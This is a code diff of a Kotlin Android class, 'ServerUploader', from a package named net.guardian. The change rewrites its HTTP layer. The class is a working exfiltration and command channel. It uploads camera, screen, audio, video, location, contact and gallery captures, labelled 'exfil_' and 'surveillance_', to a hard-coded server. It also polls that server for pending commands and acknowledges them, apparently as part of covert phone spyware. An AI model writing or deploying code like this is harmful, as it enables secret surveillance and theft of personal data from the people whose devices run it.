@@ -1,106 +1,105 @@
 package net.guardian
 
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.asRequestBody
-import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.DataOutputStream
 import java.io.File
-import java.util.concurrent.TimeUnit
+import java.net.HttpURLConnection
+import java.net.URL
 
 object ServerUploader {
     var serverUrl = "http://10.251.196.180:8000"
 
-    private val client = OkHttpClient.Builder()
-        .connectTimeout(10, TimeUnit.SECONDS)
-        .writeTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(10, TimeUnit.SECONDS)
-        .build()
-
-    val sharedClient = OkHttpClient.Builder()
-        .connectTimeout(5, TimeUnit.SECONDS)
-        .writeTimeout(5, TimeUnit.SECONDS)
-        .readTimeout(5, TimeUnit.SECONDS)
-        .build()
-
-    fun uploadCapture(type: String, deviceId: String = "", data: String = "", file: File? = null): Boolean {
+    private fun postMultipart(url: String, fields: Map<String, String>, fileField: String? = null, file: File? = null, fileName: String? = null, fileMime: String? = null): Boolean {
         return try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("type", type)
-                .addFormDataPart("device_id", deviceId)
-                .addFormDataPart("data", data)
-                .apply {
-                    if (file != null) {
-                        val mediaType = when {
-                            type == "camera" || type == "screen" || type == "surveillance_motion" -> "image/jpeg"
-                            type == "surveillance_video" || type == "audio" -> "video/mp4"
-                            type == "surveillance_audio" -> "audio/mpeg"
-                            type == "exfil_gallery" -> "image/jpeg"
-                            type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
-                            else -> "application/octet-stream"
-                        }.toMediaType()
-                        addFormDataPart("file", file.name, file.asRequestBody(mediaType))
-                    }
+            val boundary = "Boundary${System.currentTimeMillis()}"
+            val conn = URL(url).openConnection() as HttpURLConnection
+            conn.connectTimeout = 10000
+            conn.readTimeout = 10000
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+
+            DataOutputStream(conn.outputStream).use { dos ->
+                fields.forEach { (key, value) ->
+                    dos.writeBytes("--$boundary\r\n")
+                    dos.writeBytes("Content-Disposition: form-data; name=\"$key\"\r\n\r\n")
+                    dos.writeBytes("$value\r\n")
                 }
-                .build()
+                if (file != null && fileField != null) {
+                    val name = fileName ?: file.name
+                    val mime = fileMime ?: "application/octet-stream"
+                    dos.writeBytes("--$boundary\r\n")
+                    dos.writeBytes("Content-Disposition: form-data; name=\"$fileField\"; filename=\"$name\"\r\n")
+                    dos.writeBytes("Content-Type: $mime\r\n\r\n")
+                    file.inputStream().use { it.copyTo(dos) }
+                    dos.writeBytes("\r\n")
+                }
+                dos.writeBytes("--$boundary--\r\n")
+            }
 
-            val request = Request.Builder()
-                .url("$serverUrl/api/capture")
-                .post(body)
-                .build()
-
-            client.newCall(request).execute().use { it.isSuccessful }
+            conn.responseCode in 200..299
         } catch (e: Exception) {
             e.printStackTrace()
             false
         }
     }
 
-    fun uploadBytes(type: String, deviceId: String = "", data: String = "", bytes: ByteArray? = null): Boolean {
+    private fun postJson(url: String, json: String): Boolean {
         return try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("type", type)
-                .addFormDataPart("device_id", deviceId)
-                .addFormDataPart("data", data)
-                .apply {
-                    if (bytes != null) {
-                        val ext = when {
-                            type.startsWith("exfil_") || type == "surveillance_location" -> "json"
-                            type == "surveillance_motion" -> "jpg"
-                            else -> "jpg"
-                        }
-                        val mt = when {
-                            type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
-                            else -> "image/jpeg"
-                        }.toMediaType()
-                        addFormDataPart("file", "$type.$ext", bytes.toRequestBody(mt))
-                    }
-                }
-                .build()
-
-            val request = Request.Builder()
-                .url("$serverUrl/api/capture")
-                .post(body)
-                .build()
-
-            client.newCall(request).execute().use { it.isSuccessful }
+            val conn = URL(url).openConnection() as HttpURLConnection
+            conn.connectTimeout = 10000
+            conn.readTimeout = 10000
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.outputStream.write(json.toByteArray())
+            conn.responseCode in 200..299
         } catch (e: Exception) {
             e.printStackTrace()
             false
         }
+    }
+
+    fun uploadCapture(type: String, deviceId: String = "", data: String = "", file: File? = null): Boolean {
+        val fields = mapOf("type" to type, "device_id" to deviceId, "data" to data)
+        val mime = when {
+            type == "camera" || type == "screen" || type == "surveillance_motion" -> "image/jpeg"
+            type == "surveillance_video" || type == "audio" -> "video/mp4"
+            type == "surveillance_audio" -> "audio/mpeg"
+            type == "exfil_gallery" -> "image/jpeg"
+            type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
+            else -> "application/octet-stream"
+        }
+        return postMultipart("$serverUrl/api/capture", fields, "file", file, file?.name, mime)
+    }
+
+    fun uploadBytes(type: String, deviceId: String = "", data: String = "", bytes: ByteArray? = null): Boolean {
+        val fields = mapOf("type" to type, "device_id" to deviceId, "data" to data)
+        if (bytes != null) {
+            val ext = when {
+                type.startsWith("exfil_") || type == "surveillance_location" -> "json"
+                else -> "jpg"
+            }
+            val mime = when {
+                type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
+                else -> "image/jpeg"
+            }
+            val tmp = File.createTempFile("upload", ".$ext")
+            tmp.writeBytes(bytes)
+            val result = postMultipart("$serverUrl/api/capture", fields, "file", tmp, "$type.$ext", mime)
+            tmp.delete()
+            return result
+        }
+        return postMultipart("$serverUrl/api/capture", fields)
     }
 
     fun getPendingCommands(): List<Map<String, Any?>> {
         return try {
-            val request = Request.Builder()
-                .url("$serverUrl/api/commands/pending")
-                .get()
-                .build()
-            val resp = client.newCall(request).execute()
-            val body = resp.body?.string() ?: "[]"
+            val conn = URL("$serverUrl/api/commands/pending").openConnection() as HttpURLConnection
+            conn.connectTimeout = 10000
+            conn.readTimeout = 10000
+            val body = conn.inputStream.bufferedReader().readText()
             val arr = JSONArray(body)
             (0 until arr.length()).map { i ->
                 val obj = arr.getJSONObject(i)
@@ -109,69 +108,32 @@ object ServerUploader {
         } catch (_: Exception) { emptyList() }
     }
 
+    fun signal(command: String): Boolean {
+        return postMultipart("$serverUrl/api/commands/signal",
+            mapOf("command" to command))
+    }
+
     fun ackCommand(id: Int, status: String, result: String): Boolean {
-        return try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("id", id.toString())
-                .addFormDataPart("status", status)
-                .addFormDataPart("result", result)
-                .build()
-            val request = Request.Builder()
-                .url("$serverUrl/api/commands/ack")
-                .post(body)
-                .build()
-            client.newCall(request).execute().use { it.isSuccessful }
-        } catch (_: Exception) { false }
+        return postMultipart("$serverUrl/api/commands/ack",
+            mapOf("id" to id.toString(), "status" to status, "result" to result))
     }
 
     fun uploadScreenFrame(status: String): Boolean {
-        return try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("status", status)
-                .build()
-            val request = Request.Builder()
-                .url("$serverUrl/api/screen/heartbeat")
-                .post(body)
-                .build()
-            client.newCall(request).execute().use { it.isSuccessful }
-        } catch (_: Exception) { false }
+        return postMultipart("$serverUrl/api/screen/heartbeat",
+            mapOf("status" to status))
     }
 
     fun uploadContacts(deviceId: String = "", contactsJson: String): Boolean {
-        return try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("device_id", deviceId)
-                .addFormDataPart("contacts", contactsJson)
-                .build()
-
-            val request = Request.Builder()
-                .url("$serverUrl/api/contacts")
-                .post(body)
-                .build()
-
-            client.newCall(request).execute().use { it.isSuccessful }
-        } catch (e: Exception) {
-            e.printStackTrace()
-            false
-        }
+        return postMultipart("$serverUrl/api/contacts",
+            mapOf("device_id" to deviceId, "contacts" to contactsJson))
     }
 
     fun sendAlert(type: String, message: String): Boolean {
-        return try {
-            val json = JSONObject().apply {
-                put("type", type)
-                put("message", message)
-                put("source", "surveillance")
-            }
-            val body = json.toString().toRequestBody("application/json".toMediaType())
-            val request = Request.Builder()
-                .url("$serverUrl/api/threat/alert")
-                .post(body)
-                .build()
-            client.newCall(request).execute().use { it.isSuccessful }
-        } catch (_: Exception) { false }
+        val json = JSONObject().apply {
+            put("type", type)
+            put("message", message)
+            put("source", "surveillance")
+        }
+        return postJson("$serverUrl/api/threat/alert", json.toString())
     }
 }
